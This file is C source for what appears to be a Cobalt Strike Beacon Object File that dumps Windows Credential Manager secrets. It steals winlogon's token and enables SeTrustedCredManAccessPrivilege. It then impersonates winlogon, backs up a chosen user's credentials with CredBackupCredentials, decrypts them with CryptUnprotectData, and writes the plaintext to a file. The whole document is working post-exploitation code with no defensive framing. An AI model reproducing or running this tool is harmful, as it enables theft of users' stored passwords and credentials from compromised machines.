#include <windows.h>
#include <dpapi.h>
#include <tlhelp32.h>
#include "beacon.h"
#define MAX_LENGTH 256


       WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD,WINBOOL,DWORD);
       WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
       WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
       WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
       WINADVAPI WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,WINBOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
       WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
       WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
       WINBASEAPI WINBOOL WINAPI KERNEL32$GetFileSize(HANDLE,LPDWORD);
       WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
       WINBASEAPI WINBOOL WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
       DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT,SIZE_T);
       DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
       DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
       WINIMPM WINBOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB *,LPWSTR *,DATA_BLOB *,PVOID,CRYPTPROTECT_PROMPTSTRUCT*,DWORD,DATA_BLOB *);
       WINADVAPI WINBOOL WINAPI ADVAPI32$CredBackupCredentials(HANDLE,LPCWSTR,PVOID,DWORD,DWORD);
       DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
       WINADVAPI WINBOOL WINAPI ADVAPI32$RevertToSelf();
       DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD,DWORD);
       DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$Process32First(HANDLE,LPPROCESSENTRY32);
       DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$Process32Next(HANDLE,LPPROCESSENTRY32);
       DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);
       DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf_s(wchar_t *,size_t,const wchar_t*,char *);



DWORD FindWinLogonPid(){

HANDLE hSnapShot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
PROCESSENTRY32 pe ={0};
pe.dwSize =sizeof(PROCESSENTRY32);

if (hSnapShot){

    if(KERNEL32$Process32First(hSnapShot,&pe)){
    do{
        if(MSVCRT$strcmp(pe.szExeFile,"winlogon.exe")== 0){
            return pe.th32ProcessID;
        }

    }while(KERNEL32$Process32Next(hSnapShot,&pe));
    KERNEL32$CloseHandle(hSnapShot);

   }

}
}

void go(char * args,int len){

       if(!BeaconIsAdmin()){
           BeaconPrintf(CALLBACK_OUTPUT,"You must be a admin for this to work");
           return;
        }
        datap parser;
        BeaconDataParse(&parser,args,len);
        int userpid;
        wchar_t * dumpfilepath;
        wchar_t * encfilepath;



        dumpfilepath = (wchar_t *)BeaconDataExtract(&parser,NULL);
        encfilepath = (wchar_t *)BeaconDataExtract(&parser,NULL);
        userpid = BeaconDataInt(&parser);

        BeaconPrintf(CALLBACK_OUTPUT,"Getting Winlogon Process ID\n");

        BeaconPrintf(CALLBACK_OUTPUT,"Opening Winlogon\n");
        DWORD PID = FindWinLogonPid();
        HANDLE hProc= KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,PID);
        if(hProc == NULL){
            BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$OpenProcess failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT,"Getting WinLogon Access Token\n");
        HANDLE hToken= NULL;
        DWORD status= ADVAPI32$OpenProcessToken(hProc,TOKEN_DUPLICATE,&hToken);
        if(status == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"OpenProcessToken Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT,"Duplicating Token\n");
        HANDLE impToken = NULL;
        status= ADVAPI32$DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&impToken);
        if(status == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"DuplicateTokenEx Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        TOKEN_PRIVILEGES tp ={0};
        LUID luid = {0};

        status=ADVAPI32$LookupPrivilegeValueA(NULL,"SeTrustedCredManAccessPrivilege",&luid);
        if(status == 0){

            BeaconPrintf(CALLBACK_OUTPUT,"LookupPrivilegeValue Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BeaconPrintf(CALLBACK_OUTPUT,"Adjusting Token Privileges\n");
        status= ADVAPI32$AdjustTokenPrivileges(impToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);
        if(status == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"AdjustTokenPrivileges Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT,"Getting User Token\n");
        HANDLE userProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS,FALSE,userpid);
        if(userProc == NULL){
            BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$OpenProcess Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }


        HANDLE userToken = NULL;
        status = ADVAPI32$OpenProcessToken(userProc,TOKEN_ALL_ACCESS,&userToken);
        if(status == 0){
           BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$OpenProcessToken Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT,"Impersonating Winlogon Token\n");
        status = ADVAPI32$ImpersonateLoggedOnUser(impToken);
        if(status == 0){
           BeaconPrintf(CALLBACK_OUTPUT,"ImpersonateLoggedonUser Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        status = ADVAPI32$CredBackupCredentials(userToken,(LPCWSTR)dumpfilepath,NULL,0,0);
        if(status == FALSE){
              BeaconPrintf(CALLBACK_OUTPUT,"ADVAPI32$CredBackupCredentials Failed with error code %d\n",KERNEL32$GetLastError());
              goto cleanup;

        }
        BeaconPrintf(CALLBACK_OUTPUT,"Decrypting Backup File\n");
        HANDLE hFile = KERNEL32$CreateFileW((LPCWSTR)dumpfilepath,GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hFile == NULL){
              BeaconPrintf(CALLBACK_OUTPUT,"CreateFile Failed with error code %d\n",KERNEL32$GetLastError());
              goto cleanup;

        }
        DWORD dwFileSize = KERNEL32$GetFileSize(hFile,NULL);
        if(dwFileSize == INVALID_FILE_SIZE){
              BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$GetFileSize Failed with error code %d\n",KERNEL32$GetLastError());
              goto cleanup;

        }
        CHAR *backupFile = KERNEL32$GlobalAlloc(GPTR,(SIZE_T)dwFileSize);
        DWORD dwRead = 0;
        KERNEL32$ReadFile(hFile,backupFile,dwFileSize,&dwRead,NULL);
        if(dwRead == 0){
              BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$ReadFile Failed with error code %d\n",KERNEL32$GetLastError());
              goto cleanup;

        }
        DATA_BLOB creds = {0};
        creds.cbData = dwFileSize;
        creds.pbData = (BYTE*)backupFile;

        DATA_BLOB verify ={0};
        status = CRYPT32$CryptUnprotectData(&creds,NULL,NULL,NULL,NULL,0,&verify);
        if(status == FALSE){
            BeaconPrintf(CALLBACK_OUTPUT,"CRYPT32$CryptUnprotectData Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }

        status=ADVAPI32$RevertToSelf();
        if(status == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"RevertToSelf failed %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }

        BeaconPrintf(CALLBACK_OUTPUT,"Writing credentials to specified file\n");
        DWORD dwWrite=0;
        HANDLE hwFile = KERNEL32$CreateFileW((LPCWSTR)encfilepath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hwFile == NULL){
              BeaconPrintf(CALLBACK_OUTPUT,"CreateFile Failed with error code %d\n",KERNEL32$GetLastError());
              goto cleanup;

        }

        KERNEL32$WriteFile(hwFile,(CHAR *)verify.pbData,verify.cbData,&dwWrite,NULL);
        if(dwWrite == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"KERNEL32$WriteFile Failed with error code %d\n",KERNEL32$GetLastError());
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT,"Success, check out decrypted credentials at %S\n",encfilepath);

        cleanup:
            if(hProc){
                KERNEL32$CloseHandle(hProc);
            }
            if(hToken){
                KERNEL32$CloseHandle(hToken);
            }
            if(impToken){
                KERNEL32$CloseHandle(impToken);
            }
            if(userProc){
                KERNEL32$CloseHandle(userProc);
            }
            if(userToken){
                KERNEL32$CloseHandle(userToken);
            }
            if(hFile){
                KERNEL32$CloseHandle(hFile);
            }
            if(backupFile){
                KERNEL32$GlobalFree(backupFile);
            }
            if(hwFile){
                KERNEL32$CloseHandle(hwFile);
            }

}

